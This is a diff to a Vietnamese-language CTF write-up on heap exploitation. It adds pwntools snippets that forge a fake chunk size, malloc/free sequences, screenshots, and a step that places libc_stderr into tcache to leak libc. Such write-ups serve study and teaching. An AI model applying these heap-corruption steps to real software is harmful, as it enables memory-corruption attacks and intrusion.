@@ -13,6 +13,7 @@
 **2. Exploit**
  ### Leak libc
   - Để đưa libc và fakechunk về cùng 1 chunk thì ta cần control size = 0x90 của chunk, với fakechunk thì khá dễ vì ta có thể control nó bằng cách nhập từ name
+  - `r.sendafter(b'Name', b'\x41'*8 + p64(0x91))` tạo size cho fakechunk
   - Tạo 4 chunk và giải phóng nó.
   ```
   malloc(size_, b'a')
@@ -41,6 +42,7 @@
   malloc(size_, b'a')
   ```
   - ![image](https://user-images.githubusercontent.com/113702087/220079920-00e4a33c-1fc8-4b36-a435-32a44e3e3f61.png)
+  - ![image](https://user-images.githubusercontent.com/113702087/220081175-9c7c37e6-f9d1-4c71-999e-2e3d788289c4.png)
   - thay đổi size libc_stderr và đưa vào tcache_c
   ```
   payload = b'\x00'*40 + p64(0x91)
@@ -48,4 +50,6 @@
   malloc(size_ + 24, b'\x87')
   freeandinfo(b'2')
   ```
-  - ![image](https://user-images.githubusercontent.com/113702087/220081175-9c7c37e6-f9d1-4c71-999e-2e3d788289c4.png)
+  - ![image](https://user-images.githubusercontent.com/113702087/220081883-10198633-7bb4-4635-b8cb-092b55a79ee3.png)
+  - Sau khi đưa libc_stderr vào tcache ta free(fakechunk) tcache 0x90: `fakechunk->libc_stderr`
+  - 
